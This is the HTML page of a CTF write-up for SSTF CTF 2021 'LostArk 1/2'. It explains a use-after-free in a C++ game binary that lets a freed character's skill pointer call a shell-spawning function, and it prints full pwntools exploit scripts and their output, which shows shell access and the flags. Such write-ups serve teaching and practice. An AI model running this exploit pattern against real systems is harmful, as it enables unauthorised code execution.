@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>SSTF CTF 2021 - LostArk 1/2 | kileak</title>
+
+
+
+
+
+<meta name="description" content="SSTF CTF 2021 - LostArk 1/2">
+
+
+<meta name="keywords" content="sstf, lostark">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2021/sstf-lostark/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">SSTF CTF 2021 - LostArk 1/2</h1>
+      <p class="post-meta">Aug 17, 2021</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>LostArk 1/2
+<!--break--></p>
+
+  <p>Description</p>
+
+  <p>Pwn the Acracia!</p>
+
+  <p>nc lostark.sstf.site 1337</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/sstf21/lostark/L0stArk">L0stArk</a> <a href="https://kileak.github.io/assets/sstf21/lostark/xpl.py">xpl.py</a></p>
+
+  <p>Team: Super Guesser</p>
+</blockquote>
+
+<h1 id="lostark-1">LostArk 1</h1>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">----------------------------------------------
+ === menu ===
+1. Create a new character
+2. Delete a character
+3. List
+4. Choose a character
+5. Set skill
+6. Use skill
+7. Exit
+pick: 
+----------------------------------------------</code></pre></figure>
+
+<p>The binary lets you create different characters (Reaper / Bard / Warlord / Lupeon), which have different “Skills”, that can be set and used.</p>
+
+<p>A Lupeon has only one skill <code class="language-plaintext highlighter-rouge">gift</code>, which will open a shell, but skills for him are “blocked” and cannot be directly executed.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="n">Character</span><span class="o">::</span><span class="n">useSkill</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">isSkillBlocked</span><span class="p">())</span> 
+        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"blocked"</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">Skill</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">this</span><span class="o">-&gt;</span><span class="n">Skill</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Set skill first"</span> <span class="o">&lt;&lt;</span><span class="n">endl</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Lupeon uses the default implementation of <code class="language-plaintext highlighter-rouge">isSkillIsBlocked</code> from the base character, which returns <code class="language-plaintext highlighter-rouge">true</code>, while the other characters override the method and return <code class="language-plaintext highlighter-rouge">false</code> for it, and execute <code class="language-plaintext highlighter-rouge">Skill</code>, if it is set.</p>
+
+<p>A character with a set skill will look like this in memory.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x555555570ea0:	0x0000000000000000	0x0000000000000061
+0x555555570eb0:	0x000055555555dbf8	0x0000555555570ec8  &lt;= VTable / Name
+0x555555570ec0:	0x0000000000000008	0x4141414141414141  &lt;= Name string
+0x555555570ed0:	0x0000000000000000	0x0000555555570ee8  &lt;= XXX / Type
+0x555555570ee0:	0x0000000000000006	0x0000726570616552  &lt;= Type string
+0x555555570ef0:	0x0000000000000000	0x00005555555574f0  &lt;= XXX / Active Skill
+0x555555570f00:	0x0000000000000000	0x0000000000000021</code></pre></figure>
+
+<p>So, for the first LostArk, it’s pretty simple to execute the Lupeons special skill</p>
+
+<ul>
+  <li>Create a lupeon (lupeon <code class="language-plaintext highlighter-rouge">ctor</code> will set active skill to <code class="language-plaintext highlighter-rouge">gift</code>)</li>
+  <li>Delete lupeon (character chunk will get freed)</li>
+  <li>Create any other character (since character creation doesn’t initialize active skill, it will still point to Lupeons gift)</li>
+  <li>Select character</li>
+  <li>Use skill</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"lostark.sstf.site"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1337</span>
+<span class="n">PROCESS</span> <span class="o">=</span> <span class="s">"./L0stArk"</span>
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="nb">type</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">type</span><span class="p">))</span>
+
+    <span class="k">if</span> <span class="nb">type</span> <span class="o">!=</span> <span class="mi">7</span><span class="p">:</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"pick: "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">choose</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"pick: "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"pick: "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">useskill</span><span class="p">():</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"6"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">create</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
+    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"AAAA"</span><span class="p">)</span>
+    <span class="n">choose</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">useskill</span><span class="p">()</span>
+    
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    
+    <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="c1"># e = ELF("./L0stArk")
+</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>      
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./L0stArk"</span><span class="p">)</span>
+        <span class="k">print</span> <span class="p">(</span><span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
+        <span class="n">pause</span><span class="p">()</span>
+    
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[+] Opening connection to lostark.sstf.site on port 1337: Done
+[*] Switching to interactive mode
+
+= use skill =
+$ id
+uid=1000(lostark) gid=1000(lostark) groups=1000(lostark)
+$ cat /flag
+SCTF{Wh3r3 1s 4 Dt0r?}</code></pre></figure>
+
+<h1 id="lostark-2">LostArk 2</h1>
+
+<blockquote>
+  <p>Attachment: <a href="https://kileak.github.io/assets/sstf21/lostark2/patch">patch</a> <a href="https://kileak.github.io/assets/sstf21/lostark2/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<p>In LostArk 2, a <code class="language-plaintext highlighter-rouge">dtor</code> was added for each character, in which the active skill for the character will be reset before the object gets freed.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="n">Lupeon</span><span class="o">::~</span><span class="n">Lupeon</span><span class="p">(</span><span class="n">Character</span> <span class="o">*</span><span class="n">this</span><span class="p">)</span>
+<span class="p">{</span>  
+  <span class="n">this</span><span class="o">-&gt;</span><span class="n">ActiveSkill</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">Character</span><span class="o">::~</span><span class="n">Character</span><span class="p">(</span><span class="n">this</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This kills the simple reallocation solution from part 1. But, there’s a new bug in the <code class="language-plaintext highlighter-rouge">pickChar</code> method.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">pickChar</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  
+
+  <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">endl</span><span class="o">&lt;&lt;</span><span class="s">"== choose =="</span><span class="o">&lt;&lt;</span><span class="n">endl</span><span class="p">;</span>
+  
+  <span class="p">...</span> 
+      
+  <span class="n">Character</span><span class="o">*</span> <span class="kt">char</span> <span class="o">=</span> <span class="n">CHARACTERS</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
+
+  <span class="n">picked_c</span><span class="p">.</span><span class="n">reset</span><span class="p">(</span><span class="kt">char</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The <code class="language-plaintext highlighter-rouge">reset</code> function will “destroy the object and takes ownership of it”. Calling this, will <code class="language-plaintext highlighter-rouge">free</code> the object, without calling the <code class="language-plaintext highlighter-rouge">dtor</code> of it. Exactly what we need.</p>
+
+<p>So the plan for this changes to</p>
+
+<ul>
+  <li>Create a lupeon</li>
+  <li>Create random char</li>
+  <li>Choose lupeon character (sets active skill to <code class="language-plaintext highlighter-rouge">gift</code>)</li>
+  <li>Choose random char (this frees the lupeon character without calling dtor)</li>
+  <li>Create another char (this will be placed in the just freed lupeon)</li>
+  <li>Choose the newly created char</li>
+  <li>Use skill to trigger <code class="language-plaintext highlighter-rouge">gift</code></li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">create</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>           <span class="c1"># create lupeon
+</span>    <span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="p">))</span>   <span class="c1"># create random char
+</span>        
+    <span class="n">choose</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>               <span class="c1"># choose lupeon
+</span>    <span class="n">choose</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>               <span class="c1"># frees picked char (not calling dtor)
+</span>
+    <span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x40</span><span class="p">))</span>   
+    <span class="n">choose</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"6"</span><span class="p">)</span>         <span class="c1"># use skill (will be lupeon skill)
+</span>    
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    
+    <span class="k">return</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[+] Opening connection to lostark2.sstf.site on port 1337: Done
+[*] Switching to interactive mode
+
+= use skill =
+$ cat /flag
+SCTF{KUKURUPPINGPPONG!}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=SSTF CTF 2021 - LostArk 1/2&amp;url=https://kileak.github.io/ctf/2021/sstf-lostark/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2021/sstf-lostark/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2021/sstf-lostark';
+        var disqus_title = 'SSTF CTF 2021 - LostArk 1/2';
+        var disqus_url = 'https://kileak.github.io/ctf/2021/sstf-lostark';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
